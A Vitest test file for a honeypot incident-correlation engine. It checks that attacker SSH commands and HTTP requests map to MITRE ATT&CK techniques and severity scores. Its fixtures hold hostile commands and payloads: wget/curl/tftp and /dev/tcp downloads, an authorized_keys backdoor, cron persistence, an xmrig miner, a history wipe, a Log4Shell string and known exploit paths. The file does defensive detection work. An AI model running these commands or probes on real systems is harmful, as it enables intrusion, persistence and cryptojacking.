import { describe, expect, it } from "vitest";
import { computeFeatures } from "../../src/correlation/features.js";
import { RULES, evaluateIncident, levelForScore } from "../../src/correlation/rules.js";
import { bruteForce, httpReq, minerSession, spray, sshAuth, sshCmd } from "../fixtures/events.js";

/** @param {any[]} events @param {any} [intel] */
const evaluate = (events, intel) => evaluateIncident(computeFeatures(events), intel);
/** @param {any[]} events */
const ids = (events) => evaluate(events).techniques.map((t) => t.id);

describe("rule table", () => {
  it("has unique technique ids with valid ATT&CK id format", () => {
    const seen = new Set();
    for (const rule of RULES) {
      expect(rule.id).toMatch(/^T\d{4}(\.\d{3})?$/);
      expect(seen.has(rule.id)).toBe(false);
      seen.add(rule.id);
    }
  });
});

describe("credential access", () => {
  it("T1110 fires at the brute-force threshold, not below", () => {
    expect(ids(bruteForce(4))).not.toContain("T1110");
    expect(ids(bruteForce(5))).toContain("T1110");
  });

  it("T1110.001 for many passwords against one user", () => {
    expect(ids(bruteForce(6))).toEqual(expect.arrayContaining(["T1110", "T1110.001"]));
    expect(ids(bruteForce(6))).not.toContain("T1110.003");
  });

  it("T1110.003 for many usernames with few passwords", () => {
    const r = ids(spray(8));
    expect(r).toContain("T1110.003");
    expect(r).not.toContain("T1110.001");
  });

  it("does not call it spraying when every username gets a unique password", () => {
    const events = Array.from({ length: 8 }, (_, i) => sshAuth(`u${i}`, `p${i}`));
    expect(ids(events)).not.toContain("T1110.003");
  });

  it("counts HTTP login form posts toward brute force", () => {
    const posts = Array.from({ length: 5 }, (_, i) =>
      httpReq("/login", { http_method: "POST", username: "admin", password: `x${i}` })
    );
    expect(ids(posts)).toContain("T1110");
  });

  it("T1078 for a successful fake login", () => {
    expect(ids([sshAuth("root", "123456", true)])).toContain("T1078");
    expect(ids([sshAuth("root", "nope", false)])).not.toContain("T1078");
  });
});

describe("execution, persistence, impact", () => {
  it.each([
    ["T1059.004", "ls -la"],
    ["T1105", "wget http://x/y"],
    ["T1105", "curl -O http://x/y"],
    ["T1105", "tftp -g -r bot 1.2.3.4"],
    ["T1105", "cat < /dev/tcp/1.2.3.4/80"],
    ["T1053.003", "crontab -r"],
    ["T1053.003", "echo '* * * * * x' > /etc/cron.d/x"],
    ["T1098.004", "cat key >> /root/.ssh/authorized_keys"],
    ["T1496", "./xmrig --donate-level 1"],
    ["T1496", "nohup ./run -o stratum+tcp://pool:3333 &"],
    ["T1082", "cat /proc/cpuinfo"],
    ["T1033", "whoami"],
    ["T1070.003", "unset HISTFILE"],
    ["T1222.002", "chmod +x payload"]
  ])("%s from command %j", (id, command) => {
    expect(ids([sshCmd(command)])).toContain(id);
  });

  it.each([
    ["T1105", "echo wgetting"],
    ["T1496", "cat /etc/xmrigs.conf.bak.md"],
    ["T1033", "wget x"],
    ["T1053.003", "cat crontabs"]
  ])("%s does not fire on near-miss %j", (id, command) => {
    expect(ids([sshCmd(command)])).not.toContain(id);
  });
});

describe("http reconnaissance and exploitation", () => {
  it("T1595 for path probing above threshold", () => {
    const paths = ["/a", "/b", "/c", "/d"].map((p) => httpReq(p));
    expect(ids(paths)).not.toContain("T1595");
    expect(ids([...paths, httpReq("/e")])).toContain("T1595");
  });

  it.each([
    "/cgi-bin/luci",
    "/.env",
    "/wp-login.php",
    "/.git/config",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/index.php?s=/Index/\\think\\app/invokefunction",
    "/static/..%2f..%2fetc/passwd",
    "/global-protect/login.esp",
    "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
  ])("T1190 for exploit path %s", (path) => {
    expect(ids([httpReq(path)])).toContain("T1190");
  });

  it("T1190 for Log4Shell in a header", () => {
    expect(ids([httpReq("/", { user_agent: "${jndi:ldap://x.example/a}" })])).toContain("T1190");
  });

  it("no T1190 for benign paths", () => {
    expect(ids([httpReq("/"), httpReq("/favicon.ico"), httpReq("/environment")])).not.toContain("T1190");
  });
});

describe("severity", () => {
  it("maps scores to documented levels", () => {
    expect([0, 19, 20, 44, 45, 69, 70].map(levelForScore)).toEqual([
      "low", "low", "medium", "medium", "high", "high", "critical"
    ]);
  });

  it("a lone scanner is low", () => {
    expect(evaluate([httpReq("/")]).severity).toBe("low");
  });

  it("a 10-attempt brute force is medium; threat intel adds to the score", () => {
    expect(evaluate(bruteForce(10)).severity).toBe("medium"); // 15 + 5 = 20
    expect(evaluate(bruteForce(10), { abuse_confidence: 100 }).score).toBe(30);
  });

  it("any successful login is at least high", () => {
    const r = evaluate([sshAuth("root", "123456", true)]);
    expect(r.severity).toBe("high");
    expect(r.reasons.join(" ")).toContain("floor");
  });

  it("login + payload/persistence is critical, with all expected techniques and tags", () => {
    const r = evaluate(minerSession());
    expect(r.severity).toBe("critical");
    expect(r.techniques.map((t) => t.id)).toEqual(
      expect.arrayContaining(["T1078", "T1059.004", "T1105", "T1053.003", "T1098.004", "T1496", "T1070.003", "T1082"])
    );
    expect(r.tags).toEqual(expect.arrayContaining(["credential-success", "persistence", "cryptomining", "malware-download"]));
  });

  it("GreyNoise benign/RIOT lowers the score but never below zero", () => {
    expect(evaluate([httpReq("/")], { greynoise_riot: true }).score).toBe(0);
  });

  it("every matched technique carries evidence text", () => {
    for (const t of evaluate(minerSession()).techniques) expect(t.evidence.length).toBeGreaterThan(0);
  });
});
